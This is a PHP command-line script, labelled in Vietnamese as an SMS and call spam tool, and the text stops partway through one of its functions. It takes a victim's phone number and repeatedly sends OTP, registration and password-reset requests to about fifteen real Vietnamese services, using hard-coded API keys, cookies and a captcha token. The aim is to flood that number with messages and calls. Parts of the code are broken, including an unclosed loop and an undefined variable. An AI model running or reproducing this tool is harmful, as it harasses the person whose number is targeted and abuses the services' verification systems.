<?php
date_default_timezone_set('Asia/Ho_Chi_Minh');
/***[ Color ]***/
$xnhac = "\033[1;36m";
$do = "\033[1;31m";
$luc = "\033[1;32m";
$vang = "\033[1;33m";
$xduong = "\033[1;34m";
$hong = "\033[1;35m";
$trang = "\033[1;37m";
$cyan= "\e[1;36m";
/***[ Đánh Dấu Bản Quyền ]***/
$thanh_xau = $do."[".$trang ."=.=".$do."] ".$trang."=> ";
$thanh_dep = $do."[".$trang ."=.=".$do."] ".$trang."=> ";
$thanh = $do."[".$trang ."=.=".$do."] ".$trang."=> ";
$vinh = $trang."\033[1;37m= = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = = =\n";
/***[ Config ]***/
$delay = 30;

$introMessages = [
    "$do LƯU Ý TRƯỚC KHI SỬ DỤNG",
    "$vang ĐÂY LÀ MÃ NGUỒN MỞ TÔI SẼ KHÔNG CHỊU TRÁCH NHIỆM CHO CÁC HÀNH VI SAI TRÁI NÀO CỦA BẠN.",
    "$hong NẾU BẠN ĐỒNG Ý CHỊU TRÁCH NHIỆM HOÀN TOÀN CHO CÁC HÀNH VI SAI TRÁI BẠN GÂY RA, THÌ HÃY NHẬP $do y $hong  ĐỂ TIẾP TỤC VÀ NHẬP $do n $hong ĐỂ THOÁT."
];

foreach ($introMessages as $message) {
    echo $message . "\n";
}

while (true) {
    echo $thanh_dep . $luc . "Nhập lựa chọn của bạn: ";
    $xac_nhan = trim(fgets(STDIN));

    if ($xac_nhan === 'y') {
        // Tiếp tục chạy code
        break;
    } elseif ($xac_nhan === 'n') {
        exit; // Thoát khỏi tool

/***[ Banner ]***/
$banner = "

\033[1;31m────────────────────────────────────────────────────────────
\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;33mTOOL SPAM SMS + CALL

\033[1;31m────────────────────────────────────────────────────────────\n";
@system("clear");
/***[ Clear + Thông Số Admin ]***/
if (strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') { 
    @system('clear'); 
} else { 
    @system('cls'); 
}
while(true){
echo $thanh_dep.$luc."Nhập SDT Cần Spam: $vang";
$sdt = trim(fgets(STDIN));
echo $thanh_dep.$luc."Nhập 1 để tiếp tục: $trang";
$delay = trim(fgets(STDIN));
sleep(2);
echo"\033[1;31m────────────────────────────────────────────────────────────\n";
$kho = array("0387069080", "0976026179", "0865786643", "0389615762", "0399318119");
if ($sdt == "0"){
	echo $thanh.$do."Tập Làm Người Đi Nhé=))\n";
	continue;
} elseif(!preg_match('/([0-9])/', $sdt, $math)) {
echo $thanh.$do."Vui Lòng Nhập Đúng Định Dạng SDT\n";
} elseif(in_array($sdt, $kho)) {
echo $thanh.$do."Vui Lòng Nhập Số Điện Thoại Hợp lệ\n";
} elseif (strlen($sdt) < 10) {
echo $thanh.$do."Số Điện Thoại Phải Là 10 Chữ Số\n";
} else {
	break;
}
}
while(true) {
	$VAYNO = VAYNO($sdt);
	$LOZI = LOZI($sdt);
	$TAMO = TAMO($sdt);
	$ZALO = ZALOPAY($sdt);
	$TIENOI = TIENOI($sdt);
	$MOCA = MOCA($sdt);
	$META_VN = META_VN($sdt);
	$FPTSHOP = FPTSHOP($sdt);
	$TV = TV360($sdt);
	$VT = VIETTELL($sdt);
	$DONGPLUS = DONGPLUS($sdt);
	$POPS = POPS($sdt);
	$VTPAY = VTPAY($sdt);
	$VIEON = VIEON($sdt);
	$array = array(
		"MOMO" => $MOMO["msg"],
		"MOCA" => $MOCA["MOCA"],
		"META_VN" => $META_VN["meta"],
		"FPTSHOP" => $FPTSHOP["fptshop"],
		"TV360" => $TV["tv360"],
		"ZALOPAY" => $ZALO["ZaloPay"],
		"TIENOI" => $TIENOI["TIENOI"],
		"VIETTELL" => $VT["VIETTEL"],
		"VIETTELLPAY" => $VTPAY["VTPAY"],
		"TAMO" => $TAMO,
		"LOZI" => $LOZI["LOZI"],
		"VAYNO" => $VAYNO["VAYNO"],
		"DONGPLUS" => $DONGPLUS["DONGPLUS"],
		"POPS" => $POPS["POPS"],
		"VIEON" => $VIEON["VIEON"],
	);
$dem++;
if($array["MOMO"] == "Thành Công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."MOMO".$trang."]\n"; usleep(10000);
		}
		if($array["MOCA"] == "Thành Công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."MOCA".$trang."]\n"; usleep(10000);
		}
		if($array["META_VN"] == "Thành Công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."META".$trang."]\n"; usleep(10000);
		}
		if($array["FPTSHOP"] == "Thành Công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."FPTSHOP".$trang."]\n"; usleep(10000);
		}
		if($array["TV360"] == "Thành Công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."TV360".$trang."]\n"; usleep(10000);
		}
		if($array["VIETTELL"] == "Thành Công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."VIETTELL".$trang."]\n"; usleep(10000);
		}
		if($array["VIETTELLPAY"] == "Thành công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."VIETTELLPAY".$trang."]\n"; usleep(10000);
		}
		if($array["TAMO"] == "Thành Công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."TAMO".$trang."]\n"; usleep(10000);
		}
		if($array["VAYNO"] == "Thành công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."VAYNO".$trang."]\n"; usleep(10000);
		}
		if($array["ZALOPAY"] == "Thành Công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."ZALOPAY".$trang."]\n"; usleep(10000);
		}
		if($array["TIENOI"] == "Thành Công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."TIENOI".$trang."]\n"; usleep(10000);
		}
		if($array["LOZI"] == "Thành công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."LOZI".$trang."]\n"; usleep(10000);
		}
		if($array["DONGPLUS"] == "Thành Công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."DONGPLUS".$trang."]\n"; usleep(10000);
		}
		if($array["POPS"] == "Thành Công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."POPS".$trang."]\n"; usleep(10000);
		}
		if($array["VIEON"] == "Thành Công"){
			$dem = $dem + 1;
			echo $do."[".$trang.$dem.$do."] \033[1;37m[".$cyan."MOUSE_TOOL".$trang."] [".$vang."THÀNH CÔNG".$trang."] [".$luc."VIEON".$trang."]\n"; usleep(10000);
			///
		}
		delay($delay);
	unlink("get.txt");
}























function delay($delay)
{
	for ($tt = $delay; $tt >= 1; $tt--) {
		echo "\r\033[1;33m   SPAM  \033[1;31m ~>       \033[1;32m LO      \033[1;31m | $tt | ";
		usleep((1/7)*1000000);
		echo "\r\033[1;31m   SPAM  \033[1;33m   ~>     \033[1;37m LOA     \033[1;31m | $tt | ";
		usleep((1/7)*1000000);
		echo "\r\033[1;32m   SPAM  \033[1;33m     ~>   \033[1;37m LOAD    \033[1;31m | $tt | ";
		usleep((1/7)*1000000);
		echo "\r\033[1;34m   SPAM  \033[1;33m      ~>  \033[1;37m LOADI   \033[1;31m | $tt | ";
		usleep((1/7)*1000000);
		echo "\r\033[1;35m   SPAM  \033[1;33m       ~> \033[1;37m LOADIN  \033[1;31m | $tt | ";
		usleep((1/7)*1000000);
		echo "\r\033[1;35m   SPAM  \033[1;33m       ~> \033[1;37m LOADING \033[1;31m | $tt | ";
		usleep((1/7)*1000000);
		echo "\r\033[1;35m   SPAM  \033[1;33m        ~>\033[1;37m LOADING.\033[1;31m | $tt | ";
		usleep((1/7)*1000000);
	}
	echo "\r\033[1;35m    ⚡SPAM⚡                   \r";
}

function VIEON($sdt){
	$head = array(
		"Host: vieon.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded",
		"origin: https://vieon.vn",
		"referer: https://vieon.vn/",
	);
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://vieon.vn/",
		CURLOPT_CUSTOMREQUEST => "GET",
		CURLOPT_ENCODING => '',
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_RETURNTRANSFER => 1,
	));
	$access = curl_exec($ch);
	$token = explode('"', explode('"token":"', $access)[1])[0];
	$head = array(
		"Host: api.vieon.vn",
		"accept: application/json, text/plain, */*",
		"authorization: ".$token,
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded",
		"origin: https://vieon.vn",
		"x-requested-with: mark.via.gp",
		"sec-fetch-site: same-site",
		"sec-fetch-mode: cors",
		"sec-fetch-dest: empty",
		"referer: https://vieon.vn/",
		"accept-encoding: gzip, deflate",
		"accept-language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
	);
	$data = 'phone_number='.$sdt.'&password=123456789&given_name=&device_id=598a3da6a4b7d1450b2a247bd080ca9d&platform=mobile_web&model=Android%2012&push_token=&device_name=Chrome%2F96&device_type=desktop&ui=012021';
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_POSTFIELDS => $data,
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_RETURNTRANSFER => 1,
	));
	$access = json_decode(curl_exec($ch),true);
	if($access["error"] == 400){
		$data = 'phone_number='.$sdt.'&platform=mobile_web&ui=012021';
		curl_setopt_array($ch, array(
			CURLOPT_URL => "https://api.vieon.vn/backend/user/forget/forget_password?platform=mobile_web&ui=012021",
			CURLOPT_CUSTOMREQUEST => "POST",
			CURLOPT_POSTFIELDS => $data,
			CURLOPT_RETURNTRANSFER => 1,
		));
		$access = json_decode(curl_exec($ch),true);
	}
	if($access["register_session_id"] or $access["status"] == 1){
		return array("VIEON" => "Thành Công");
	} else {
		return array("VIEON" => "Thất Bại");
	}
}
function POPS($sdt){
	$head = array(
		"Host: pops.vn",
		"content-type: application/json",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"accept: */*",
		"origin: https://pops.vn",
		"referer: https://pops.vn/auth/signin-signup/signup",
		"cookie: ssid=:1678719841"
	);
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://pops.vn/auth/signin-signup/signup",
		CURLOPT_CUSTOMREQUEST => "GET",
		CURLOPT_ENCODING => '',
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_RETURNTRANSFER => 1,
	));
	$access = curl_exec($ch);
	$token = explode('"', explode('"DEFAULT_TOKEN":"', $access)[1])[0];
	$head = array(
		"Host: products.popsww.com",
		"profileid: 64078d77bb84c700517c9ce4",
		"authorization: ".$token,
		"x-env: production",
		"content-type: application/json",
		"lang: vi",
		"sub-api-version: 1.1",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"api-key: 5d2300c2c69d24a09cf5b09b",
		"platform: wap",
		"accept: */*",
		"origin: https://pops.vn",
		"x-requested-with: mark.via.gp",
		"sec-fetch-site: cross-site",
		"sec-fetch-mode: cors",
		"sec-fetch-dest: empty",
		"referer: https://pops.vn/auth/signin-signup/signup",
		"accept-encoding: gzip, deflate",
		"accept-language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
		"cookie: ssid=:1678719841"
	);
	$data = '{"fullName":"","account":"'.$sdt.'","password":"123456789","confirmPassword":"123456789"}';
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://products.popsww.com/api/v5/auths/register",
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_POSTFIELDS => $data,
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_RETURNTRANSFER => 1,
	));
	$access = json_decode(curl_exec($ch),true);
	if($access["meta"]){
		return array("POPS" => "Thành Công");
	} else if($access["error"]["statusCode"] == 400){
		$data = '{"account":"'.$sdt.'"}';
		curl_setopt_array($ch, array(
			CURLOPT_URL => "https://products.popsww.com/api/v5/auths/forgotPassword",
			CURLOPT_CUSTOMREQUEST => "POST",
			CURLOPT_POSTFIELDS => $data,
			CURLOPT_HTTPHEADER => $head,
			CURLOPT_RETURNTRANSFER => 1,
		));
		$access = json_decode(curl_exec($ch),true);
		if($access["data"]["status"] == "OK"){
			return array("POPS" => "Thành Công");
		} else {
			return array("POPS" => "Thất Bại");
		}
	}
}
function DONGPLUS($sdt){
	$sdt = "84". $sdt;
	$sdt = explode("840", $sdt)[1];
	$head = array(
		"Host: api.dongplus.vn",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://dongplus.vn",
		"x-requested-with: mark.via.gp",
		"sec-fetch-site: same-site",
		"sec-fetch-mode: cors",
		"sec-fetch-dest: empty",
		"referer: https://dongplusvn/user/login",
		"accept-encoding: gzip, deflate"
	);
	$data = '{"full_name":"Khang Nguyễn","first_name":"Nguyễn","last_name":"Khang","mobile_phone":"84'.$sdt.'","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}';
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://api.dongplus.vn/api/user",
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_ENCODING => '',
		CURLOPT_POSTFIELDS => $data,
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_RETURNTRANSFER => 1,
	));
	$access = json_decode(curl_exec($ch),true);
	$data = '{"phone":"84'.$sdt.'"}';
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://api.dongplus.vn/api/user/send-one-time-password",
		CURLOPT_POSTFIELDS => $data,
		CURLOPT_RETURNTRANSFER => 1,
	));
	$access = curl_exec($ch);
	if(json_decode($access,true)["loan_processing_enabled"] == ""){
		return array("DONGPLUS" => "Thành Công");
	} else {
		return array("DONGPLUS" => "Thất Bại");
	}
}
function TIENOI($sdt){
	$head = array(
		"Host: app.tienoi.com.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://app.tienoi.com.vn",
		"referer: https://app.tienoi.com.vn/auth/registration?need=2000000&days=14",
	);
	$data = '{"mobilePhone":"'.$sdt.'","password":"A123456789a","passwordConfirmation":"A123456789a","isVoiceSms":true}';
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode",
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_ENCODING => '',
		CURLOPT_POSTFIELDS => $data,
		CURLOPT_COOKIEJAR => "get.txt",
		CURLOPT_COOKIEFILE => "get.txt",
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_RETURNTRANSFER => 1,
	));
	$access = curl_exec($ch);
	if(json_decode($access,true)["id"]){
		return array("TIENOI" => "Thất Bại");
	} else {
		return array("TIENOI" => "Thành Công");
	}
}
function VAYNO($sdt){
	$head = array(
		"Host: atmonline.com.vn",
		"accept: application/json, text/plain, */*",
		"authorization: ",
		"user-agent: Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://atmonline.com.vn",
		"x-requested-with: mark.via.gp",
		"sec-fetch-site: same-origin",
		"sec-fetch-mode: cors",
		"sec-fetch-dest: empty",
		"referer: https://atmonline.com.vn/portal-new/login?mobilePhone=0333480642&requestedAmount=6000000&requestedTerm=4&locale=vn&designType=NEW",
		"accept-encoding: gzip, deflate",
		"accept-language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
		"cookie: SESSION=Yzc5NDE1OWUtZjJhYS00Mjc0LThhZWMtNjA0MzgxNTI1YzA4",
		"cookie: DESIGN_TYPE=NEW",
		"cookie: _gid=GA1.3.940747723.1678286924",
		"cookie: _fbp=fb.2.1678286924040.593353617",
		"cookie: _hjFirstSeen=1",
		"cookie: _hjSession_1331607=eyJpZCI6ImMzOWE2OGMyLTVkNGYtNDM0OS1iNTc1LTY0NmMzZDE1MzJhZCIsImNyZWF0ZWQiOjE2NzgyODY5MjQxNTIsImluU2FtcGxlIjpmYWxzZX0=",
		"cookie: _hjAbsoluteSessionInProgress=1",
		"cookie: _fw_crm_v=66847224-751b-46e4-dda7-d7896107c101",
		"cookie: _hjSessionUser_1331607=eyJpZCI6IjhlMGRkNWQ2LTNlMDctNTg3NS1hYTY2LTUxZTFlM2E5MjMwYiIsImNyZWF0ZWQiOjE2NzgyODY5MjQxMTYsImV4aXN0aW5nIjp0cnVlfQ==",
		"cookie: _ga=GA1.3.37906421.1678286924",
		"cookie: _hjIncludedInSessionSample_1331607=1",
		"cookie: _gat_UA-105967508-3=1",
		"cookie: _ga_181P8FC3KD=GS1.1.1678288786.2.1.1678288955.60.0.0"
	);
	$data = '{"mobilePhone":"'.$sdt.'","source":"ONLINE"}';
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://atmonline.com.vn/back-office/api/json/auth/sendAcceptanceCode",
		CURLOPT_CUSTOMREQUEST => $POST,
		CURLOPT_ENCODING => '',
		CURLOPT_POST => TRUE,
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_POSTFIELDS => $data,
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_FOLLOWLOCATION => TRUE
	));
	$access = json_decode(curl_exec($ch),true);
	if($access["actionIdentifier"]){
		return array("VAYNO" => "Thành công");
	} else {
		return array("VAYNO" => "Thất Bại");
	}
}
function LOZI($sdt){
	$head = array(
		"Host: mocha.lozi.vn",
		"content-length: 47",
		"x-city-id: 50",
		"x-lozi-client: 1",
		"accept-language: vi",
		"x-access-token: unknown",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://lozi.vn",
		"x-requested-with: mark.via.gp",
		"sec-fetch-site: same-site",
		"sec-fetch-mode: cors",
		"sec-fetch-dest: empty",
		"referer: https://lozi.vn/",
		"accept-encoding: gzip, deflate",
		"cookie: _fbp=fb.1.1678239299193.1370902497"
	);
	$data = '{"countryCode":"84","phoneNumber":"'.$sdt.'"}';
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://mocha.lozi.vn/v1/invites/use-app",
		CURLOPT_CUSTOMREQUEST => $POST,
		CURLOPT_ENCODING => '',
		CURLOPT_POST => TRUE,
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_POSTFIELDS => $data,
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_FOLLOWLOCATION => TRUE
	));
	$access = json_decode(curl_exec($ch),true);
	if($access["data"]["phoneNumber"]){
		return array("LOZI" => "Thành công");
	} else {
		return array("LOZI" => "Thất Bại");
	}
}
function F88($sdt){
	$head = array(
		'Host: api.f88.vn',
		'accept: application/json, text/plain, */*',
		'content-encoding: gzip',
		'user-agent: Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36',
		'content-type: application/json',
		'origin: https://online.f88.vn',
		'x-requested-with: mark.via.gp',
		'sec-fetch-site: same-site',
		'sec-fetch-mode: cors',
		'sec-fetch-dest: empty',
		'referer: https://online.f88.vn/',
		'accept-encoding: gzip, deflate',
		'accept-language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
	);
	$data = '{"phoneNumber":"'.$sdt.'","recaptchaResponse":"03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO","source":"Online"}';
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP",
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_ENCODING => '',
		CURLOPT_POST => TRUE,
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_POSTFIELDS => $data,
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_FOLLOWLOCATION => TRUE
	));
	$access = json_decode(curl_exec($ch),true);
	if($access["message"] == "Gửi mã OTP thành công."){
		return array("F88" => "Thành công");
	} else {
		return array("F88" => "Thất Bại");
	}
}
function TAMO($sdt){
	$head = array(
		"Host: api.tamo.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
		"content-type: application/json;charset=UTF-8",
		"origin: https://www.tamo.vn",
		"x-requested-with: mark.via.gp",
		"sec-fetch-site: same-site",
		"sec-fetch-mode: cors",
		"sec-fetch-dest: empty",
		"referer: https://www.tamo.vn/",
		"accept-encoding: gzip, deflate",
		"accept-language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
	);
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://api.tamo.vn/web/public/client/phone/sms-code-ts",
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_ENCODING => '',
		CURLOPT_POST => TRUE,
		CURLOPT_POSTFIELDS => '{"mobilePhone":{"number":"'.$sdt.'"}}',
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_SSL_VERIFYHOST => FALSE,
		CURLOPT_SSL_VERIFYPEER => FALSE,
		CURLOPT_TIMEOUT => 60,
		CURLOPT_CONNECTTIMEOUT => 60,
		CURLOPT_FOLLOWLOCATION => TRUE,
	));
	$access = json_decode(curl_exec($ch),true);
	if($access["data"][0] == ""){
		return "Thành Công";
	} else {
		return "Thất Bại";
	}
}
function MOCA($sdt){
	$head = array(
		'Host: moca.vn',
		'Accept: */*',
		'Device-Token: '.generateImei(),
		'X-Requested-With: XMLHttpRequest',
		'Accept-Language: vi',
		'X-Moca-Api-Version: 2',
		'platform: P_IOS-2.10.42',
		'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.3',
	);
	$data = array(
		'api_args' => array(
			'lgUser' => $sdt,
			'act' => 'send',
			'type' => 'phone',
		),
		'api_method' => 'CheckExist',
	);
	$GET = json_decode(_curl("GET", "https://moca.vn/moca/v2/users/role?phoneNumber=".$sdt, http_build_query($data), $head),true);
	$token = $GET["data"]["registrationId"];
	$GET = json_decode(_curl("POST", "https://moca.vn/moca/v2/users/registrations/".$token."/verification", http_build_query($data), $head),true);
	if($GET["returnText"] == "Giao dịch thành công."){
		return array(
			"MOCA" => "Thành Công"
		);
	} else {
		return array(
			"MOCA" => "Thất Bại"
		);
	}
}
function META_VN($sdt){
	$head = array(
		'user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
		'Authorization: Bearer null'
	);
	$data = array(
		'api_args' => array(
			'lgUser' => $sdt,
			'act' => 'send',
			'type' => 'phone',
		),
		'api_method' => 'CheckExist',
	);
	$GET = json_decode(_curl("POST", "https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1", json_encode($data), $head),true);
	if($GET["Status"] == "send_ok"){
		return array("meta" => "Thành Công");
	} else {
		return array("meta" => $GET["Message"]);
	}
}
function FPTSHOP($sdt){
	$head = array(
		"Host: fptshop.com.vn",
		"Connection: keep-alive",
		"Accept: */*",
		"X-Requested-With: XMLHttpRequest",
		"User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.85 Mobile Safari/537.36",
		"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
		"Sec-Fetch-Site: same-origin",
		"Sec-Fetch-Mode: cors",
		"Sec-Fetch-Dest: empty",
		"Accept-Encoding: gzip, deflate",
		"Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
	);
	$ch = curl_init();
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://fptshop.com.vn",
		CURLOPT_CUSTOMREQUEST => "GET",
		CURLOPT_ENCODING => '',
		CURLOPT_POST => TRUE,
		CURLOPT_COOKIEJAR => "get.txt",
		CURLOPT_COOKIEFILE => "get.txt",
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_SSL_VERIFYHOST => FALSE,
		CURLOPT_SSL_VERIFYPEER => FALSE,
		CURLOPT_TIMEOUT => 60,
		CURLOPT_CONNECTTIMEOUT => 60,
		CURLOPT_FOLLOWLOCATION => TRUE,
	));
	$access = curl_exec($ch); 
	$data = 'phone='.$sdt;
	curl_setopt_array($ch, array(
		CURLOPT_URL => "https://fptshop.com.vn/api-data/loyalty/Login/Verification",
		CURLOPT_CUSTOMREQUEST => "POST",
		CURLOPT_COOKIEFILE => "get.txt",
		CURLOPT_HTTPHEADER => $head,
		CURLOPT_RETURNTRANSFER => 1,
		CURLOPT_POSTFIELDS => $data,
	));
	$GET = json_decode(curl_exec($ch),true);
	if($GET["datas"]["expiredSeconds"] == "299"){
		unlink("get.txt");
		return array("fptshop" => "Thành Công");
	} else {
		return array("fptshop" => "error");
	}
}
function TV360($sdt){
	$url = "http://m.tv360.vn/public/v1/auth/get-otp-login";
	$ch = curl_init();
	$data = '{"msisdn":"'.$sdt.'"}';
	$head = array(
		"Host: m.tv360.vn",
		"Connection: keep-alive",
		"Accept: application/json, text/plain, */*",
		"User-Agent: Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36",
		"Content-Type: application/json",
		"Origin: http://m.tv360.vn",
		"X-Requested-With: mark.via.gp",
		"Referer: http://m.tv360.vn/login?r=http%3A%2F%2Fm.tv360.vn%2F",
		"Accept-Encoding: gzip, deflate",
		"Accept-Language: vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
	);
	curl_setopt_array($ch, array(
		CURLOPT_URL => $url,
